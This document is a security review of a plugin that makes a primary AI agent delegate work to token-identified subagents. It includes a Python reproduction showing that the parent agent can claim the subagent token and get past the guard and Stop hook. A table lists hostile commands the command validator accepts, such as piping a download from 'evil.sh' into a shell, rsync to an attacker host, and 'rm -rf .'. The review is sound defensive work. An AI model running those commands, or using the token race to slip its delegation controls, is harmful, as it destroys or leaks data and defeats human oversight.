# Adversarial Review — `antigravity-attention-guard-plugin`

**Target**: `attention-guard/antigravity-attention-guard-plugin/` (remote: `git@github.com:vinhthang/antigravity-attention-guard-plugin.git`, HEAD `e2c3594`)
**Reviewed**: working tree, 2026-09-13 (21 paths dirty vs HEAD)
**Method**: source reading + AST analysis + executed reproductions against the real hook scripts

**Verdict**: The design is sound — a token-based delegation guard with an explicit FSM and an auditable SQLite ledger is the right shape. The implementation does not currently hold up. There is **one P0 that defeats the plugin's entire purpose**, and the plugin **fails its own zero-error-suppression conformance test**.

**Test suite**: `39 passed, 1 failed` — the failure is the plugin's own conformance gate (see P1-3).

---

## Severity summary

| ID | Severity | Area | Finding |
|---|---|---|---|
| **P0-1** | **P0** | Identity / Guard bypass | Subagent token is claimable by the *parent*, inverting every role decision |
| P1-1 | P1 | Failure mode | `inject-rules.py` fails **open**: token issuance silently skipped, all subagents bricked |
| P1-2 | P1 | Identity | `is_subagent()` scans only the first 8192 bytes of the transcript |
| P1-3 | P1 | Conformance | 15 bare-`pass` handlers; the repo's own AST test fails; the rule it cites does not exist |
| P1-4 | P1 | Data contracts | Role schemas are mandated in `rules/` but never enforced at runtime |
| P1-5 | P1 | Validation | `payload_validator` ships two divergent validators; the lax one is what runs |
| P1-6 | P1 | Command policy | `command_validator` is unwired *and* bypassable (arbitrary code, remote exfil, workspace wipe) |
| P1-7 | P1 | Deployment | `deploy_plugin.py` is non-atomic, no rollback, keeps stale files, accepts broken hook manifests |
| P1-8 | P1 | Packaging | The entire new subsystem is **untracked**; a clone does not contain `schemas/` or the validators |
| P1-9 | P1 | Documentation | README documents 3 hooks (there are 4) and claims Python 3.6+ (it needs 3.8+) |
| P1-10 | P1 | Portability | `command_validator` hardcodes `/Users/thanghoang/...` in three places |
| P2-1..11 | P2 | Perf / hygiene | See §P2 |

---

## P0-1 — Token claim race inverts the guard (verified reproduction)

### Mechanism

`common.is_subagent()` decides "am I a subagent?" by scanning the transcript for `[ANTIGRAVITY_TOKEN:<uuid>]` and then calling `ledger.claim_token(token, conv_id)`. Claiming is **first-come-first-served across conversations** — the first conversation that presents an unclaimed token is declared the subagent:

```python
# scripts/common.py:44-63
matches = re.finditer(r'\[ANTIGRAVITY_TOKEN:([a-f0-9\-]+)\]', content)
for match in matches:
    token = match.group(1)
    ... SELECT payload FROM events WHERE type = 'WORK_PREPARED' AND payload LIKE ? ...
    if ledger.claim_token(token, conv_id):     # <-- any conv_id wins the race
        return True, may_delegate, remaining_depth, parent_conv_id, parent_turn_id
```

But `inject-rules.py` writes the token into the **`invoke_subagent` arguments**, which the *parent's own* transcript records:

```python
# scripts/inject-rules.py:55
sa["Prompt"] = f"[ANTIGRAVITY_TOKEN:{token}]\n\n" + sa.get("Prompt", "") + injected
```

So the token is simultaneously (a) the child's identity credential and (b) a string sitting in the parent's transcript. Whichever conversation runs a hook first claims it.

### Executed reproduction

```python
# Run from attention-guard/antigravity-attention-guard-plugin with ./.venv/bin/python
import importlib.util, io, json, os, re, sys, tempfile
S = os.path.abspath("scripts"); sys.path.insert(0, S)
tmp = tempfile.mkdtemp(); os.environ["AGY_APP_DATA_DIR"] = tmp

def load(n, p):
    sp = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(sp)
    sys.modules[n] = m; sp.loader.exec_module(m); return m
def run(mod, payload, name):
    out = io.StringIO()
    mod.main(argv=[name], stdin=io.StringIO(json.dumps(payload)), stdout=out)
    return json.loads(out.getvalue().strip())

inject  = load("inject_rules",  os.path.join(S, "inject-rules.py"))
enforce = load("enforce_delegation", os.path.join(S, "enforce-delegation.py"))
stop    = load("attention_check", os.path.join(S, "attention-check.py"))

PARENT, CHILD = "parent-conversation-1111", "child-conversation-2222"

# 1. Parent spawns a subagent -> plugin issues a token and rewrites the prompt
res = run(inject, {"conversationId": PARENT, "stepIdx": 3, "transcriptPath": "",
                   "toolCall": {"name": "invoke_subagent",
                                "args": {"Subagents": [{"Prompt": "Apply the diff", "TypeName": "Worker"}]}}},
          "inject-rules.py")
tok = re.search(r"\[ANTIGRAVITY_TOKEN:([a-f0-9\-]+)\]", res["overwrite"]["Subagents"][0]["Prompt"]).group(1)

# 2. The parent's transcript now contains that tool call, hence the token
pt = os.path.join(tmp, "parent.jsonl")
open(pt, "w").write(
    json.dumps({"source": "MODEL", "type": "PLANNER_RESPONSE", "step_index": 3,
                "tool_calls": [{"name": "invoke_subagent",
                                "args": {"Subagents": [{"Prompt": res["overwrite"]["Subagents"][0]["Prompt"]}]}}]}) + "\n")

# 3. Parent makes ANY other tool call before the child does
print(run(enforce, {"conversationId": PARENT, "transcriptPath": pt,
                    "toolCall": {"name": "run_command", "args": {"CommandLine": "rm -rf build/"}}},
          "enforce-delegation.py"))

# 4. The real child now arrives
ct = os.path.join(tmp, "child.jsonl")
open(ct, "w").write(json.dumps({"source": "USER_EXPLICIT", "type": "USER_INPUT", "step_index": 0,
                                "content": f"[ANTIGRAVITY_TOKEN:{tok}]\n\nApply the diff"}) + "\n")
print(run(enforce, {"conversationId": CHILD, "transcriptPath": ct,
                    "toolCall": {"name": "replace_file_content", "args": {"TargetFile": "/repo/app.py"}}},
          "enforce-delegation.py"))

# 5. Parent's Stop hook
print(run(stop, {"conversationId": PARENT, "transcriptPath": pt, "fullyIdle": True}, "attention-check.py"))
```

Observed output:

```
2. PARENT run_command -> {'decision': 'allow'}                       <-- guard bypassed
3. REAL CHILD replace_file_content -> {'decision': 'deny', ...}       <-- child bricked
4. PARENT Stop hook -> {'decision': 'allow'}                          <-- Stop guard skipped
```

### Impact

Three simultaneous failures, all from the plugin's own normal operation — no attacker required:

1. **Total guard bypass.** `enforce-delegation.py` line 54-59 returns `allow` for every tool except further delegation once `is_sub` is true. The primary agent is granted shell execution and unrestricted file writes — exactly what the plugin exists to prevent.
2. **Legitimate subagent bricked.** The child is classified as the primary agent and denied every `replace_file_content` / `run_command`. The workflow dead-ends with a nonsensical "you must delegate to a subagent" message.
3. **Stop guard disabled.** `attention-check.py` line 62 short-circuits for subagents, so the delegation reminder never fires for the parent.

The misclassification is **sticky**: the token row stays claimed for 48 h (the `_prune_opportunistically` cutoff), so every subsequent hook call in that conversation is misclassified.

### Remediation

Bind the token to the intended child at issuance, and never let the parent's transcript be a credential source:

- Record the intended recipient at issuance (`inject-rules.py` cannot know the child's `conversationId`, so use a one-time **nonce that is not written into the parent transcript** — e.g. inject a `\n\n<!--AGY-HANDOFF:<token>-->` marker that the harness strips, or pass the credential out-of-band via a per-spawn cache file the parent never reads).
- Add a **parent-conversation exclusion**: `claim_token` must refuse if `conv_id == parent_conv_id` recorded in the `WORK_PREPARED` payload. This alone closes the reproduction above.
- Make the claim **atomic and single-use with an expected-recipient check**, and log refusals to stderr instead of silently falling through.

---

## P1 findings

### P1-1 — `inject-rules.py` fails open (silent)

```python
# scripts/inject-rules.py:59-60
except Exception:
    emit({"decision": "allow"})
```

The per-subagent `try` correctly fails closed (deny) on token-issuance failure, but the **outer** handler catches everything else — including reading `rules/EXECUTOR.md` (lines 24-25, which precede the loop). If that read fails, the hook emits `allow` with **no tokens injected at all**. Every spawned subagent then has no credential, is classified as the primary agent (P0-1 / P1-2), and is denied all work. A transient filesystem or locale error therefore converts a working session into a fully blocked one, with no diagnostic.

### P1-2 — Transcript scan is truncated at 8192 bytes

```python
# scripts/common.py:41-44
with open(transcript_path, "r", encoding="utf-8") as f:
    content = f.read(8192)
matches = re.finditer(r'\[ANTIGRAVITY_TOKEN:([a-f0-9\-]+)\]', content)
```

Verified: a token at byte offset 0 is detected; the same token at offset 9000 is not.

```
token at offset 0      -> is_subagent=True
token at offset 9000   -> is_subagent=False
```

The plugin's own `tests/test_large_prompt.py` only tests the token-first case, so this is uncovered. A subagent whose transcript preamble exceeds 8 KB is misclassified as the primary agent and blocked. Streaming the scan (or searching incrementally until first match) removes the limit.

### P1-3 — The plugin violates its own zero-error-suppression rule

`rules/AGENTS.md` line 9 mandates: *"Strictly adhere to `rules/no-error-suppression.md`. Zero error suppression, no bare `pass`, and no silent failure swallows."*

- **`rules/no-error-suppression.md` does not exist** in this plugin (only `AGENTS.md`, `COORDINATOR.md`, `EXECUTOR.md`).
- **15 bare-`pass` except handlers** across 5 scripts:

| File | Count | Lines |
|---|---|---|
| `attention-check.py` | 5 | 13, 23, 30, 55, 126 |
| `ledger.py` | 5 | 35, 37, 39, 41, 43 |
| `common.py` | 3 | 27, 29, 71 |
| `diagnostics.py` | 1 | 39 |
| `enforce-delegation.py` | 1 | 50 |

- **3 additional fail-open swallows**: `attention-check.py:46`, `attention-check.py:48`, `inject-rules.py:59` (all `except → emit({"decision": "allow"})`).
- **No script writes to `stderr` at all** — the plugin is entirely undiagnosable in production.
- **The repo's own gate fails**: `tests/test_dalio_conformance.py::TestNoBarePassAST::test_ast_no_error_suppression` → `FAILED … Found bare 'pass' in ExceptHandler in diagnostics.py at line 39`. The test aborts on the *first* violation, so the other 14 are never reported.

`attention-check.py:13` and `:23` use bare `except:` (not `except Exception:`), which also swallows `KeyboardInterrupt` and `SystemExit`.

### P1-4 — Role data contracts are mandated but never enforced

`EXECUTOR.md` ("Return a valid JSON payload conforming to `schemas/executor-payload.json`"), `COORDINATOR.md`, and `AGENTS.md` all make schema conformance a hard requirement. `payload_validator.py` implements it — but **no hook references it**. `hooks.json` wires only `enforce-delegation.py`, `inject-rules.py`, `record-tool-result.py`, `attention-check.py`. The PostToolUse hook that actually sees subagent results (`record-tool-result.py`, 33 lines) does no validation:

```python
error = payload.get("error")
if error: event_type = Event.HANDOFF_FAILED.name
else:     event_type = Event.HANDOFF_ACCEPTED.name
ledger.insert_event(...)
```

An executor returning a malformed or dishonest payload (e.g. `status: "completed"` with `failed: 3`) is accepted and recorded as `HANDOFF_ACCEPTED`. The entire "Don't Tolerate Problems" contract is documentation only.

### P1-5 — Two divergent validators; the lax one runs

`validate_payload()` uses `jsonschema` if importable and otherwise falls back to `validate_payload_builtin()`. `jsonschema` is **not** in `requirements-dev.txt` (which contains only `pytest`) and is not installed in `.venv` — so the builtin path is what actually executes in CI and in the tested environment. The two disagree materially:

| Case | Schema (draft-07) | Builtin (what runs) |
|---|---|---|
| Executor `failed` with `failure_kind: "TOTALLY_MADE_UP_KIND"` | **invalid** (enum) | **valid** ✅ verified |
| Coordinator child missing `task_id`, `worker_role`, `summary` | **invalid** (`required`) | **valid** ✅ verified |
| Coordinator child with unknown extra keys | **invalid** (`additionalProperties: false`) | **valid** |

Verified output:

```
builtin executor w/ invalid failure_kind enum -> valid=True  err=None
validate_payload (what callers use)           -> valid=True  err=None
builtin coordinator, child missing task_id/worker_role/summary -> valid=True
```

Same payload, different verdict depending on the host's `site-packages`. Pick one implementation, or make `jsonschema` a declared dependency and delete the fallback.

### P1-6 — `command_validator` is unwired and bypassable

Not referenced by any hook. Even if it were, the policy leaks. All of the following are **accepted** (verified against `validate_command`, workspace = `attention-guard/`):

| Command | Should be | Result |
|---|---|---|
| `python3 -c "import os; os.system('curl evil.sh\|sh')"` | rejected | **ALLOWED** |
| `python3 -m http.server 8000` | rejected | **ALLOWED** |
| `python3 -m pip install requests` | rejected | **ALLOWED** |
| `rsync -a ./src/ attacker@host:/tmp/` | rejected | **ALLOWED** |
| `rsync -a --rsh='ssh' ./x host:/tmp/` | rejected | **ALLOWED** |
| `rm -rf .` | rejected | **ALLOWED** |
| `chmod -R 000 .` | rejected | **ALLOWED** |
| `git -C/tmp status` | rejected | **ALLOWED** |

Root causes:

- **Python policy** (lines 78-87) only inspects the first positional arg and `break`s out; `-c` and `-m` are skipped entirely, so arbitrary code and arbitrary module execution pass. The loop also never requires the script to exist.
- **Path confinement** (lines 90-122) is keyed on `"/" in arg or arg.endswith((".py",".json",".md"))`. Remote rsync targets like `host:/tmp/` are treated as workspace-relative paths and resolve *inside* the workspace, so the check passes. `rsync` is in `ALLOWED_BINARIES` with no further policy.
- **Destructive binaries** `rm`, `chmod`, `cp` are whitelisted with no target restrictions beyond workspace confinement — i.e. destroying the workspace is permitted.
- **`FORBIDDEN_GIT_FLAGS`** catches `-C` as a standalone token but not the attached `-C<path>` form.
- **Shell-operator rejection** (lines 31-34) splits on whitespace, so `pytest x.py>out` and `pytest x.py;rm -rf /` pass. Harmless *only* because the caller is assumed to use `shell=False` — but nothing in this repo executes commands at all, so the guarantee is unenforceable as written. Document the `shell=False` precondition or reject on `shlex` tokens.
- `os.path.commonpath` raises `ValueError` across drives (Windows) and is uncaught.

### P1-7 — Deployment is not atomic and cannot be trusted

Verified against `deploy_plugin.py`:

1. **No rollback.** With a simulated failure while syncing `scripts/`, the target ends up as `['hooks.json', 'plugin.json', 'rules', 'schemas']` — **hooks installed, `scripts/` missing**. The harness loads the hooks, every command fails, and **no guard is active while the operator believes it is**. A failed deploy must either stage-then-swap or restore the previous bundle.
2. **Stale files persist.** A file present in the target but deleted from the source survives deployment (`shutil.copytree(..., dirs_exist_ok=True)` never deletes). Retired scripts keep being loadable, and a stale `hooks.json` is never reconciled.
3. **`verify_source_bundle()` is too weak.** It checks existence and JSON *syntax* only. Verified: a `hooks.json` whose Stop command points at `./scripts/does-not-exist.py` passes validation with `valid=True, missing=[]`. It should also assert that every hook command's script resolves, and that `plugin.json`/`hooks.json` are structurally sane.
4. **`--verify-only` does not verify the installed target**, only the source.

### P1-8 — The new subsystem is untracked; a clone is broken

`git status` shows 21 dirty paths, and these are **untracked (absent from the repo entirely)**:

```
?? schemas/
?? scripts/command_validator.py
?? scripts/deploy_plugin.py
?? scripts/payload_validator.py
?? tests/test_dalio_conformance.py
```

`rules/AGENTS.md` (modified, also uncommitted) references `schemas/`, and `tests/test_dalio_conformance.py` imports the validators. So the state that the rules describe exists only on this machine: `git clone` yields the pre-refactor plugin. Also left in the tree: `fsm_live_test.txt` (contents: `Success`) — a scratch artifact — plus `.coverage`, `__pycache__/`, `.pytest_cache/`.

### P1-9 — README contradicts the code

| README says | Reality |
|---|---|
| 3 hooks (PreToolUse ×2, Stop) | `hooks.json` has 4 — the PostToolUse `record-tool-result.py` hook is undocumented |
| "No dependencies required. Python 3.6+ only (uses stdlib)" | `deploy_plugin.py` uses `shutil.copytree(dirs_exist_ok=True)` → **Python 3.8+** |
| Feature list: enforce-delegation, inject-rules, attention-check | No mention of `fsm.py`, `ledger.py`, the SQLite ledger, `attention-guard.db`, the token/claim protocol, `schemas/`, the validators, `diagnostics.py`, or the Dalio 5-step alignment |

### P1-10 — Hardcoded developer home directory

```python
# scripts/command_validator.py:20
CROSS_REPO_PYTEST_ALLOWED = os.path.realpath("/Users/thanghoang/github/ai-review-plugin/tests")
# scripts/command_validator.py:119
scratch_dir = os.path.realpath("/Users/thanghoang/.gemini/antigravity/brain")
# scripts/command_validator.py:127 (test fixture)
ws = os.path.realpath("/Users/thanghoang/github/ai-review-plugin/attention-guard")
```

This is a published plugin. On any other machine the cross-repo pytest exemption and the scratch-directory exemption silently disappear, so legitimate commands are rejected. These must be derived from `$HOME`, an env var, or the workspace root.

---

## P2 findings (advisory)

| ID | Finding |
|---|---|
| **P2-1** | `get_turn_state()` re-reads and `json.loads`-parses the **entire** transcript on every hook call, and the PreToolUse matcher is `.*` so this runs per tool call. Measured **50.5 ms/invocation** with a 1.9 MB / 4000-step transcript, growing linearly, against a 5 s hook timeout. Cache by `(path, size, mtime)`. |
| **P2-2** | `_prune_opportunistically()` runs 4 `DELETE`s with no index on `created_at` on **every** `Ledger()` construction (**7 ms** in the fixture) — i.e. several times per tool call. Add `INDEX ON events(created_at)` and prune at most once per hour. |
| **P2-3** | `events.event_id` has no uniqueness component, so repeated identical events collide and are silently dropped: two `PRIMARY_TOOL_DENIED` at the same `stepIdx` → `insert_event` returns `True` then `False` (verified). `diagnostics.py`'s "Denied Actions" count is therefore an undercount. |
| **P2-4** | FSM replay uses `ORDER BY created_at ASC` with no tiebreaker (`rowid`), so same-timestamp events replay in unspecified order — non-deterministic state reconstruction. |
| **P2-5** | `event_id LIKE '<conv>_<turn>_%'` — `_` is a single-character wildcard in SQL `LIKE`, so the prefix match is looser than intended. Use `ESCAPE` or compare a structured column. |
| **P2-6** | `sqlite3` connections are used via `with conn:` (which commits/rolls back but does **not** close). Correctness relies on CPython refcounting; a PyPy port or a reference cycle leaks descriptors. |
| **P2-7** | `open(...)` without a context manager or `encoding=` in `attention-check.py:12,18` and `inject-rules.py:24-25`. The latter decodes UTF-8 rule files with the locale encoding. |
| **P2-8** | `enforce-delegation.py:87` denies **by default** for any unrecognized tool and `:88` denies on any internal error — with no stderr output. A new Antigravity tool name or a hook-payload shape change silently disables the primary agent behind a misleading "delegate to a subagent" message. Prefer an explicit read-only allowlist plus a logged, observable failure. |
| **P2-9** | `common.py:65-68` legacy fallback treats *any* cache file named `agy_issued_token_<token>` as proof of subagent identity, for a token found anywhere in transcript text. Nothing in the repo creates such files (dead code), but if the cache directory is writable by anything else it is a privilege-escalation path. Delete it. |
| **P2-10** | `command_validator.py:85` sets `is_deploy_script = True` when `os.path.basename(real_script) == "deploy_plugin.py"` — any file of that name anywhere in the workspace gains the elevated write exemption into `~/.gemini/config/plugins`. Compare against the canonical absolute path only. |
| **P2-11** | Repo hygiene: `attention-guard/` in the parent repo is a byte-identical partial duplicate of the inner plugin; `ORIGINAL_REQUEST.md` duplicates `.agents/ORIGINAL_REQUEST.md`; `attention-guard/hooks.json`'s relative `./scripts/...` commands are CWD-dependent (fine if the harness guarantees the plugin root as CWD — otherwise the hooks fail and the guard silently vanishes). |

---

## What is done well

- **The artifact-directory exemption is correctly hardened**: `is_artifact_path()` uses `os.path.realpath` + `os.path.commonpath`, so symlink escapes and prefix attacks are handled — `/tmp/artifacts-evil` does **not** match `/tmp/artifacts` (`test_prefix_escape_blocked` passes).
- **The P0 deployment boundary has the right shape**: the `~/.gemini/config/plugins` check is applied to every non-flag argument of every binary, and `cp test.txt ~/.gemini/config/plugins/...` is correctly rejected with `P0 Security Violation`.
- **Tokens are `uuid4`**, and all SQL uses parameterized statements — no injection surface in the ledger.
- **`fsm.py` is a clean, pure, dependency-free state machine** with an explicit `TransitionError`; it is the most testable part of the codebase.
- **`ledger.py` uses WAL + `busy_timeout`** and idempotent `ALTER TABLE` migrations.
- **The token→FSM→ledger decomposition is genuinely auditable** — `diagnostics.py` reconstructing state by replaying events is the right instinct; it just needs the ordering and identity fixes above.

---

## Recommended order of work

1. **P0-1** — refuse to claim a token when `conv_id == parent_conv_id`; stop writing the credential into the parent's transcript. Add a regression test that spawns a subagent and asserts the parent stays classified as primary.
2. **P1-3** — replace all 15 bare `pass` handlers and 3 fail-open handlers with `sys.stderr` diagnostics; then let the existing AST test pass so it can reach the remaining violations. Author `rules/no-error-suppression.md` or drop the reference.
3. **P1-1 / P1-2** — fail closed on rules-injection failure; remove the 8192-byte truncation.
4. **P1-4 / P1-5** — wire `payload_validator` into `record-tool-result.py`; delete one of the two validator implementations.
5. **P1-6 / P1-10** — reject `-c`/`-m`, require an explicit existing script, block remote rsync targets and destructive binaries, and remove the hardcoded `/Users/thanghoang` paths.
6. **P1-7 / P1-8 / P1-9** — stage-then-swap deployment with rollback and pruning of stale files; commit `schemas/` and the validators; rewrite the README against the actual `hooks.json` and actual Python floor.

---

### Note on prior reviews in this workspace

`review.md` (workspace root) reports "Zero P0, Zero P1 Blockers" for the sibling `ai-review-plugin`. That review targeted the parent plugin's implementation-vs-README conformance, not this one. The P0 above is reproduced end-to-end against the real hook scripts, so it should be treated as live.
